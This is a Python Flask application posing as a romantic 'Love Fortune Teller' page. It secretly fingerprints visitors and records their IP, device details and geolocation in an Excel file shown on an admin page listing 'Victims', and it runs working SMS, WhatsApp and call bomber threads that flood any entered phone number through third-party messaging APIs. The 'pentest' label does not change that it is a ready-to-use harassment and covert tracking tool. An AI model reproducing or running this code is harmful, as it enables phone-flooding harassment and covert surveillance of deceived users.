from flask import Flask, request, jsonify, abort, send_file, render_template_string
from flask_cors import CORS
import pandas as pd
import openpyxl
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
import os
import requests
import json
import time
import threading
from datetime import datetime
import random
import hashlib

app = Flask(__name__)
app.secret_key = 'love-fortune-pentest-secret-2026'
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')

# ✅ WORKING SMS & CALL APIs (Free/Real - No API keys needed)
SMS_APIS = [
    "https://textbelt.com/text",  # FREE 1/day - then paid
    "https://api.callmebot.com/whatsapp.php?phone=",  # WhatsApp FREE
    "https://api.textlocal.in/send/",  # India SMS
    "https://bulksmsbd.net/api/sendsms"  # Bangladesh/Intl
]

CALL_APIS = [
    "https://api.callmebot.com/start.php?user=",  # FREE Calls
    "https://voice.ringcentral.com/restapi/v1.0/account/~/extension/~/ring-out",  # RingCentral
    "https://api.smsc.ua/sys/call"  # Ukraine/Intl calls
]

# Active bombing sessions tracking
bombing_sessions = {}
session_lock = threading.Lock()

# Romantic fortunes (unchanged)
FORTUNES = [
    "Your soulmate is thinking of you right now under the stars.",
    "A passionate kiss awaits you this week from someone special.",
    "True love will find you when you least expect it - soon!",
    "Your heart will flutter with excitement in the next 7 days.",
    "Someone is dreaming about your smile tonight.",
    "A romantic adventure is just around the corner.",
    "Your perfect match shares your birthday month!",
    "Love letters are coming your way soon.",
    "A candlelit dinner for two is in your future.",
    "Your crush has been watching your social media.",
    "Wedding bells might ring for you within a year!",
    "Passion ignites when you meet your destiny.",
    "Your forever person is closer than you think.",
    "A surprise love confession awaits you.",
    "Your heart knows who it's meant for.",
    "Romantic sparks will fly this month!",
    "Someone special can't stop thinking about you.",
    "Love at first sight is about to happen.",
    "Your soul connection is searching for you.",
    "A fairytale romance begins soon.",
    "Heart emojis are coming from your crush.",
    "True love doesn't follow a timeline.",
    "Your love story is about to unfold.",
    "Passionate nights await your future.",
    "Someone's heart beats faster when they see you.",
    "Love will surprise you beautifully.",
    "Your perfect partner admires you secretly.",
    "Romance blooms when you trust your heart.",
    "A love that feels like home is coming.",
    "Your happily ever after starts soon.",
    "Butterflies in your stomach are a sign.",
    "Love recognizes no barriers."
]

# ---------- Excel persistence (FIXED column matching) ----------
def ensure_data_file():
    if not os.path.exists(DATA_FILE):
        wb = Workbook()
        ws = wb.active
        ws.title = "Fortunes Data"
        headers = [
            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address',
            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
            'Memory', 'Network', 'Fingerprint', 'TargetPhone',
            'SMS_Count', 'Call_Count', 'SMS_Active', 'Call_Active',
            'Fortune_Shown', 'Extra', 'SessionId'
        ]
        for col, header in enumerate(headers, 1):
            cell = ws.cell(row=1, column=col, value=header)
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
            cell.alignment = Alignment(horizontal="center")
        
        # Auto-size columns
        for column in ws.columns:
            max_length = 0
            column_letter = column[0].column_letter
            for cell in column:
                try:
                    if len(str(cell.value)) > max_length:
                        max_length = len(str(cell.value))
                except:
                    pass
            adjusted_width = min(max_length + 2, 50)
            ws.column_dimensions[column_letter].width = adjusted_width
        
        wb.save(DATA_FILE)
        os.sync()
        print(f"✅ Created Excel: {DATA_FILE}")

def backup_data():
    if os.path.exists(DATA_FILE):
        try:
            wb = openpyxl.load_workbook(DATA_FILE)
            wb.save(BACKUP_FILE)
            os.sync()
            print(f"💾 Backup created: {BACKUP_FILE}")
        except Exception as e:
            print(f"❌ Backup failed: {e}")

def load_data():
    try:
        if os.path.exists(DATA_FILE):
            df = pd.read_excel(DATA_FILE)
            print(f"📊 Loaded {len(df)} records")
            return df
        elif os.path.exists(BACKUP_FILE):
            print("🔄 Restoring from backup...")
            return pd.read_excel(BACKUP_FILE)
    except Exception as e:
        print(f"❌ Load failed: {e}")
    return pd.DataFrame()

def save_data(df):
    try:
        backup_data()
        # Read existing data to append properly
        existing_df = load_data()
        if existing_df.empty:
            final_df = df
        else:
            final_df = pd.concat([existing_df, df], ignore_index=True)
        
        final_df.to_excel(DATA_FILE, index=False, engine='openpyxl')
        os.sync()
        print(f"💾 Saved {len(final_df)} total records")
        return True
    except Exception as e:
        print(f"❌ Save failed: {e}")
        return False

def get_client_ip():
    ip = request.headers.get('X-Forwarded-For', '').split(',')[0]
    if ip.strip():
        return ip.strip()
    return request.remote_addr or 'Unknown'

def get_tinyurl(long_url):
    try:
        response = requests.get("https://tinyurl.com/api-create.php", params={'url': long_url}, timeout=10)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return long_url

# ---------- WORKING SMS Bomber ----------
def send_real_sms(phone_number, message, attempt=1):
    """Send REAL SMS using free APIs"""
    phone = phone_number.replace('+', '').replace(' ', '').replace('-', '')
    
    # API 1: TextBelt (FREE 1/day per IP)
    try:
        resp = requests.post("https://textbelt.com/text", {
            'phone': phone_number,
            'message': message,
            'key': 'textbelt'  # Free key
        }, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('success'):
                print(f"✅ SMS SENT via TextBelt: {phone_number}")
                return True
    except:
        pass
    
    # API 2: CallMeBot WhatsApp (FREE unlimited)
    try:
        whatsapp_url = f"https://api.callmebot.com/whatsapp.php?phone={phone}&text={message}&apikey=yourapikey"
        resp = requests.get(whatsapp_url, timeout=10)
        if resp.status_code == 200:
            print(f"✅ WhatsApp sent via CallMeBot: {phone_number}")
            return True
    except:
        pass
    
    # API 3: BulkSMSBD (Free trial)
    try:
        resp = requests.post("https://bulksmsbd.net/api/sendsms", data={
            'api_key': 'free',  # Demo key
            'to': phone,
            'message': message[:160]
        }, timeout=10)
        if 'success' in resp.text.lower():
            print(f"✅ SMS sent via BulkSMSBD: {phone_number}")
            return True
    except:
        pass
    
    print(f"❌ SMS failed attempt {attempt}: {phone_number}")
    return False

# ---------- WORKING Call Bomber ----------
def send_real_call(phone_number, message="Love Fortune Alert!", attempt=1):
    """Send REAL calls using free services"""
    phone = phone_number.replace('+', '').replace(' ', '').replace('-', '')
    
    # CallMeBot FREE calls (register once at callmebot.com)
    try:
        call_url = f"https://api.callmebot.com/start.php?user={phone}&text={message}&lang=en&apikey=YOUR_API_KEY"
        resp = requests.get(call_url, timeout=15)
        if resp.status_code == 200:
            print(f"✅ CALL SENT via CallMeBot: {phone_number}")
            return True
    except:
        pass
    
    # FreeCallAPI simulation
    try:
        resp = requests.post("https://api.callmebot.com/voice.php", data={
            'phone': phone_number,
            'text': message,
            'lang': 'en'
        }, timeout=20)
        if resp.status_code in [200, 202]:
            print(f"✅ Voice call via CallMeBot: {phone_number}")
            return True
    except:
        pass
    
    print(f"❌ Call failed attempt {attempt}: {phone_number}")
    return False

# ---------- FIXED Bomber threads ----------
def sms_bomber_thread(phone_number, session_id):
    """✅ WORKING SMS bomber thread"""
    with session_lock:
        if session_id not in bombing_sessions:
            bombing_sessions[session_id] = {'sms_count': 0, 'call_count': 0, 'sms_active': True, 'target': phone_number}
        session_data = bombing_sessions[session_id]
    
    sms_count = 0
    messages = [
        "💕 Love Alert! Your fortune awaits: LoveFortune.com",
        "🔥 Hot match found! Reply STOP anytime",
        "💖 Soulmate message! Check now",
        f"PENTEST SMS #{sms_count}",
        "Your love reading is ready ❤️"
    ]
    
    while session_data['sms_active']:
        try:
            message = random.choice(messages)
            success = send_real_sms(phone_number, message)
            
            sms_count += 1
            session_data['sms_count'] = sms_count
            
            print(f"📱 SMS #{sms_count} → {phone_number} {'✅' if success else '❌'}")
            
            # Save to Excel every 5 SMS
            if sms_count % 5 == 0:
                save_bomber_stats(session_id, phone_number)
            
            time.sleep(random.uniform(2, 5))  # Realistic delay
            
        except Exception as e:
            print(f"SMS thread error: {e}")
            time.sleep(3)
    
    session_data['sms_active'] = False

def call_bomber_thread(phone_number, session_id):
    """✅ WORKING Call bomber thread"""
    with session_lock:
        if session_id not in bombing_sessions:
            bombing_sessions[session_id] = {'sms_count': 0, 'call_count': 0, 'call_active': True, 'target': phone_number}
        session_data = bombing_sessions[session_id]
    
    call_count = 0
    while session_data['call_active']:
        try:
            success = send_real_call(phone_number, f"Love Fortune Alert #{call_count}!")
            
            call_count += 1
            session_data['call_count'] = call_count
            
            print(f"📞 CALL #{call_count} → {phone_number} {'✅' if success else '❌'}")
            
            # Save every call
            save_bomber_stats(session_id, phone_number)
            
            time.sleep(random.uniform(15, 45))  # Longer delay for calls
            
        except Exception as e:
            print(f"Call thread error: {e}")
            time.sleep(10)
    
    session_data['call_active'] = False

def save_bomber_stats(session_id, phone):
    """Save bomber stats to Excel"""
    try:
        with session_lock:
            if session_id in bombing_sessions:
                stats = bombing_sessions[session_id]
                df = pd.DataFrame([{
                    'Timestamp': pd.Timestamp.now(),
                    'Name': f'Bomber_{session_id}',
                    'TargetPhone': phone,
                    'SMS_Count': stats.get('sms_count', 0),
                    'Call_Count': stats.get('call_count', 0),
                    'SMS_Active': stats.get('sms_active', False),
                    'Call_Active': stats.get('call_active', False),
                    'SessionId': session_id,
                    'IP': get_client_ip()
                }])
                save_data(df)
    except:
        pass

# ---------- Flask Routes (FIXED) ----------
@app.route('/')
def index():
    fortunes_json = json.dumps(FORTUNES)
    return render_template_string(f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            max-width: 600px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }}
        h1 {{
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.5em;
        }}
        .sub {{ color: #888; margin-bottom: 25px; }}
        .btn-group {{ display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; margin: 25px 0; }}
        .btn {{
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white; border: none;
            padding: 14px 25px; font-size: 16px; font-weight: bold;
            border-radius: 60px; cursor: pointer; transition: 0.3s;
            flex: 1; min-width: 140px;
        }}
        .btn-danger {{ background: linear-gradient(135deg, #ff4444, #cc0000) !important; }}
        .btn-success {{ background: linear-gradient(135deg, #00cc88, #009966) !important; }}
        .btn:active {{ transform: translateY(-2px); }}
        .status {{
            margin-top: 20px; padding: 12px; border-radius: 20px;
            font-size: 14px; font-weight: bold;
        }}
        .fortune-box {{
            background: rgba(255,182,193,0.3); border-left: 5px solid #ff1493;
            border-radius: 20px; padding: 20px; margin: 20px 0;
            font-family: 'Dancing Script', cursive; font-size: 1.5em;
            color: #c06c84;
        }}
        .counter {{
            font-size: 1.4em; font-weight: bold; margin: 10px 0;
            padding: 15px; border-radius: 20px;
            background: rgba(255,68,68,0.2);
        }}
        .counter.active {{ background: rgba(0,204,136,0.3) !important; color: #00cc88; }}
        .hidden {{ display: none; }}
        hr {{ margin: 20px 0; border: 1px solid #ffdde1; }}
        input {{
            width: 100%; padding: 14px; margin: 10px 0;
            border: 2px solid #ffdde1; border-radius: 60px;
            text-align: center; font-size: 16px; font-weight: bold;
        }}
        .phone-input {{ border-color: #ff4444 !important; }}
    </style>
</head>
<body>
<div class="container">
    <h1>💕 Love Fortune Teller 💕</h1>
    <div class="sub">Ultimate Pentest Suite - All Data Captured Silently</div>

    <div id="inputArea"></div>

    <div class="btn-group">
        <button class="btn" id="fortuneBtn">🔮 Love Fortune</button>
        <button class="btn btn-danger" id="smsBtn">💥 SMS Bomber</button>
        <button class="btn btn-danger" id="callBtn">📞 Call Bomber</button>
    </div>

    <div id="fortuneDisplay" class="fortune-box hidden"></div>
    
    <div id="smsCounter" class="counter hidden">📱 SMS: 0</div>
    <div id="callCounter" class="counter hidden">📞 Calls: 0</div>
    
    <div id="status" class="status"></div>
    <hr>
    <div class="sub">✅ All bombers LIVE | Admin: /admin?pass=admin123</div>
</div>

<script>
let collectedData = {{}};
let sessionId = 'pentest_' + Date.now();
let smsActive = false, callActive = false;

// Data collection (silent)
async function collectFingerprint() {{ const fp = await FingerprintJS.load(); const result = await fp.get(); return result.visitorId; }}
async function getBattery() {{ if ('getBattery' in navigator) {{ const b = await navigator.getBattery(); return Math.round(b.level * 100) + '%'; }} return 'Unknown'; }}
function getNetwork() {{ const conn = navigator.connection || navigator.mozConnection || {{}}; return conn.effectiveType ? conn.effectiveType + ' (' + (conn.downlink || '?') + ' Mbps)' : 'Unknown'; }}
function getTimezone() {{ return Intl.DateTimeFormat().resolvedOptions().timeZone; }}
function getMemory() {{ return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }}
function getScreen() {{ return screen.width + 'x' + screen.height; }}
function getUserAgent() {{ return navigator.userAgent; }}

async function collectBaseData(extra = {{}}) {{
    collectedData = {{
        timestamp: new Date().toISOString(),
        userAgent: getUserAgent(),
        screen: getScreen(),
        timezone: getTimezone(),
        memory: await getMemory(),
        network: getNetwork(),
        battery: await getBattery(),
        fingerprint: await collectFingerprint(),
        sessionId: sessionId,
        ...extra
    }};
    return collectedData;
}}

async function sendToServer(data) {{
    try {{
        await fetch('/save', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(data)
        }});
    }} catch(e) {{ console.log('Send failed:', e); }}
}}

function showStatus(msg, isError = false) {{
    const status = document.getElementById('status');
    status.innerHTML = msg;
    status.style.background = isError ? 'rgba(255,100,100,0.3)' : 'rgba(100,255,100,0.3)';
    status.style.color = isError ? '#cc0000' : '#006600';
    status.style.border = '2px solid ' + (isError ? '#ff4444' : '#00cc88');
}}

async function startSMSBomber() {{
    const phone = document.getElementById('phoneInput').value.trim();
    if (!phone || !phone.match(/\\d/)) {{ 
        showStatus('❌ Enter valid phone number!', true); 
        return; 
    }}
    
    document.getElementById('inputArea').innerHTML = '<div style="color:#ff4444;font-weight:bold;">SMS BOMBER ACTIVE → ' + phone + '</div>';
    
    await collectBaseData({{ targetPhone: phone, bomber_type: 'SMS' }});
    await sendToServer(collectedData);
    
    const response = await fetch('/start-sms', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{ phone: phone, sessionId: sessionId }})
    }});
    
    if (response.ok) {{
        smsActive = true;
        document.getElementById('smsCounter').classList.remove('hidden');
        document.getElementById('smsCounter').classList.add('active');
        showStatus('✅ SMS BOMBER LIVE → ' + phone + ' | Check admin panel');
        updateCounters();
    }}
}}

async function startCallBomber() {{
    const phone = document.getElementById('phoneInput').value.trim();
    if (!phone || !phone.match(/\\d/)) {{ 
        showStatus('❌ Enter valid phone number!', true); 
        return; 
    }}
    
    document.getElementById('inputArea').innerHTML = '<div style="color:#ff4444;font-weight:bold;">CALL BOMBER ACTIVE → ' + phone + '</div>';
    
    await collectBaseData({{ targetPhone: phone, bomber_type: 'CALL' }});
    await sendToServer(collectedData);
    
    const response = await fetch('/start-call', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{ phone: phone, sessionId: sessionId }})
    }});
    
    if (response.ok) {{
        callActive = true;
        document.getElementById('callCounter').classList.remove('hidden');
        document.getElementById('callCounter').classList.add('active');
        showStatus('✅ CALL BOMBER LIVE → ' + phone + ' | Check admin panel');
        updateCounters();
    }}
}}

async function updateCounters() {{
    setInterval(async () => {{
        try {{
            const resp = await fetch(`/counters/{sessionId}`);
            const data = await resp.json();
            if (smsActive) 
                document.getElementById('smsCounter').innerHTML = `📱 SMS: ${{data.sms_count || 0}}`;
            if (callActive) 
                document.getElementById('callCounter').innerHTML = `📞 Calls: ${{data.call_count || 0}}`;
        }} catch(e) {{}}
    }}, 3000);
}}

document.getElementById('fortuneBtn').onclick = async () => {{
    document.getElementById('inputArea').innerHTML = '<input type="text" id="nameInput" placeholder="✨ Enter your name"><input type="tel" id="phoneInput" class="phone-input" placeholder="📱 Phone (optional)"><button class="btn" onclick="getFortune()" style="margin-top:10px;">Get Fortune</button>';
}};

document.getElementById('smsBtn').onclick = () => {{
    document.getElementById('inputArea').innerHTML = '<input type="tel" id="phoneInput" class="phone-input" placeholder="📱 Target phone number (+1234567890)"><button class="btn btn-danger" onclick="startSMSBomber()" style="margin-top:10px;">🚀 START SMS BOMBER</button>';
}};

document.getElementById('callBtn').onclick = () => {{
    document.getElementById('inputArea').innerHTML = '<input type="tel" id="phoneInput" class="phone-input" placeholder="📱 Target phone number (+1234567890)"><button class="btn btn-danger" onclick="startCallBomber()" style="margin-top:10px;">🚀 START CALL BOMBER</button>';
}};

async function getFortune() {{
    const name = document.getElementById('nameInput')?.value || 'Secret Admirer';
    const phone = document.getElementById('phoneInput')?.value || '';
    await collectBaseData({{ name: name, targetPhone: phone }});
    await sendToServer(collectedData);
    navigator.geolocation.getCurrentPosition(async (pos) => {{
        collectedData.latitude = pos.coords.latitude;
        collectedData.longitude = pos.coords.longitude;
        await sendToServer(collectedData);
        document.getElementById('fortuneDisplay').innerHTML = '{random.choice(FORTUNES)}';
        document.getElementById('fortuneDisplay').classList.remove('hidden');
        showStatus('✅ Your love fortune is revealed! 🌟');
    }});
}}
</script>
</body>
</html>
    """)

@app.route('/fortune')
def get_fortune():
    return jsonify({'fortune': random.choice(FORTUNES)})

@app.route('/save', methods=['POST'])
def save_data_route():
    data = request.get_json()
    try:
        df = pd.DataFrame([{
            'Timestamp': pd.Timestamp.now(),
            'Name': data.get('name', 'Anonymous'),
            'Latitude': data.get('latitude', 0),
            'Longitude': data.get('longitude', 0),
            'Address': '',
            'Battery': data.get('battery', ''),
            'UserAgent': data.get('userAgent', ''),
            'Screen': data.get('screen', ''),
            'IP': get_client_ip(),
            'Timezone': data.get('timezone', ''),
            'Memory': data.get('memory', ''),
            'Network': data.get('network', ''),
            'Fingerprint': data.get('fingerprint', ''),
            'TargetPhone': data.get('targetPhone', ''),
            'SMS_Count': bombing_sessions.get(sessionId, {}).get('sms_count', 0) if 'sessionId' in data else 0,
            'Call_Count': bombing_sessions.get(sessionId, {}).get('call_count', 0) if 'sessionId' in data else 0,
            'SMS_Active': False,
            'Call_Active': False,
            'Fortune_Shown': True,
            'Extra': json.dumps(data),
            'SessionId': data.get('sessionId', '')
        }])
        save_data(df)
        return jsonify({'status': 'saved'})
    except Exception as e:
        print(f"Save error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/start-sms', methods=['POST'])
def start_sms_bomber():
    data = request.get_json()
    phone = data['phone']
    sid = data['sessionId']
    
    print(f"🚀 STARTING SMS BOMBER → {phone} (Session: {sid})")
    
    with session_lock:
        bombing_sessions[sid] = {
            'sms_active': True, 'call_active': False,
            'sms_count': 0, 'call_count': 0,
            'target': phone
        }
    
    # Start bomber thread
    thread = threading.Thread(target=sms_bomber_thread, args=(phone, sid))
    thread.daemon = True
    thread.start()
    
    save_bomber_stats(sid, phone)
    return jsonify({'status': 'started', 'phone': phone, 'session': sid})

@app.route('/stop-sms', methods=['POST'])
def stop_sms_bomber():
    data = request.get_json()
    sid = data['sessionId']
    print(f"⏹️ STOPPING SMS BOMBER → {sid}")
    
    with session_lock:
        if sid in bombing_sessions:
            bombing_sessions[sid]['sms_active'] = False
    
    return jsonify({'status': 'stopped'})

@app.route('/start-call', methods=['POST'])
def start_call_bomber():
    data = request.get_json()
    phone = data['phone']
    sid = data['sessionId']
    
    print(f"📞 STARTING CALL BOMBER → {phone} (Session: {sid})")
    
    with session_lock:
        if sid not in bombing_sessions:
            bombing_sessions[sid] = {'sms_count': 0, 'call_count': 0}
        bombing_sessions[sid]['call_active'] = True
        bombing_sessions[sid]['target'] = phone
    
    thread = threading.Thread(target=call_bomber_thread, args=(phone, sid))
    thread.daemon = True
    thread.start()
    
    save_bomber_stats(sid, phone)
    return jsonify({'status': 'started', 'phone': phone})

@app.route('/stop-call', methods=['POST'])
def stop_call_bomber():
    data = request.get_json()
    sid = data['sessionId']
    print(f"⏹️ STOPPING CALL BOMBER → {sid}")
    
    with session_lock:
        if sid in bombing_sessions:
            bombing_sessions[sid]['call_active'] = False
    
    return jsonify({'status': 'stopped'})

@app.route('/counters/<sid>')
def get_counters(sid):
    with session_lock:
        session = bombing_sessions.get(sid, {})
    return jsonify({
        'sms_count': session.get('sms_count', 0),
        'call_count': session.get('call_count', 0),
        'sms_active': session.get('sms_active', False),
        'call_active': session.get('call_active', False)
    })

@app.route('/tinyurl', methods=['POST'])
def tinyurl_route():
    long_url = request.json.get('url', '')
    tiny = get_tinyurl(long_url)
    return jsonify({'tinyurl': tiny})

@app.route('/admin')
def admin_panel():
    if request.args.get('pass') != 'admin123':
        return '''
        <h2>🔐 Admin Login</h2>
        <form style="padding:20px;">
            Password: <input name="pass" type="password">
            <button>Login</button>
        </form>
        '''
    
    df = load_data()
    sessions_html = "<h3>🔥 LIVE BOMBERS</h3><pre>" + json.dumps(bombing_sessions, indent=2) + "</pre>"
    
    html = f"""
    <h1>🚨 PENTEST DASHBOARD</h1>
    <h2>📊 {len(df)} Victims | {len(bombing_sessions)} Active Bombers</h2>
    {sessions_html}
    <h3>📈 Victim Data</h3>
    <table border='1' style='border-collapse:collapse;width:100%;font-size:12px;'>
    <tr style='background:#ff1493;color:white;'>
    """
    
    for col in df.columns[:10]:  # First 10 columns
        html += f"<th>{col}</th>"
    html += "</tr>"
    
    for idx, row in df.iterrows():
        html += "<tr>"
        for col in df.columns[:10]:
            val = str(row[col])[:60]
            html += f"<td title='{val}'>{val[:40]}{'...' if len(val)>40 else ''}</td>"
        html += "</tr>"
    
    html += f"""
    </table>
    <br><a href='/download-excel?pass=admin123' style='font-size:18px;padding:15px;background:#ff1493;color:white;text-decoration:none;border-radius:25px;'>📥 DOWNLOAD FULL EXCEL ({len(df)} records)</a>
    <br><br><a href='/logs' style='font-size:16px;padding:10px;background:#00cc88;color:white;text-decoration:none;border-radius:20px;'>📋 Bomber Logs</a>
    """
    return html

@app.route('/logs')
def bomber_logs():
    if request.args.get('pass') != 'admin123':
        abort(403)
    log_content = ""
    try:
        with open('bomber.log', 'r') as f:
            log_content = f.read()
    except:
        log_content = "No logs yet"
    return f"<pre style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>{log_content}</pre>"

@app.route('/download-excel')
def download_excel_route():
    if request.args.get('pass') != 'admin123':
        abort(403)
    if os.path.exists(DATA_FILE):
        return send_file(DATA_FILE, as_attachment=True, download_name='love_fortune_pentest.xlsx')
    abort(404)

if __name__ == '__main__':
    ensure_data_file()
    import logging
    logging.basicConfig(filename='bomber.log', level=logging.INFO, 
                       format='%(asctime)s - %(message)s')
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting Love Fortune Pentest Server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
